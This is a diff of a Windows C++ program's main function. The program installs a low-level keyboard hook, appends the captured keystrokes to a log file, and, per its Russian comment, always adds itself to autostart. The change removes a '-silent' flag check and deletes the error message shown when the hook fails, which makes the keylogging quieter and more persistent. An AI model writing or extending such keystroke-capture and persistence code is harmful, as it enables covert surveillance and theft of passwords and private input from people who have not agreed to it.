@@ -395,25 +395,12 @@ int main(){
 
     LoadConfigPath();
 
-    //append
-    file.open(logFilePath, ios_base::app | ios_base::binary);
-
-    bool silentMode = false;
-    int argc;
-    wchar_t** argv = CommandLineToArgvW(GetCommandLineW(), &argc);
-    
-    if (argv && argc > 1) {
-        for (int i = 1; i < argc; i++) {
-            if (wcscmp(argv[i], L"-silent") == 0) {
-                silentMode = true;
-                break;
-            }
-        }
-        LocalFree(argv);
-    }
-    
     // Всегда добавляем в автозапуск при запуске
     AddToStartup();
+
+    //append
+    file.open(logFilePath, ios_base::app | ios_base::binary);
+    
 
     if (file.tellp() == 0) {
         // UTF-8 BOM
@@ -424,9 +411,8 @@ int main(){
 
     CreateTrayWindow();
 
-    if (!(hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0))){
-        MessageBoxA(NULL, "Someting has gone wrong!", "Error", MB_ICONERROR);
-    }
+    hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
+
 
     MSG message;
 
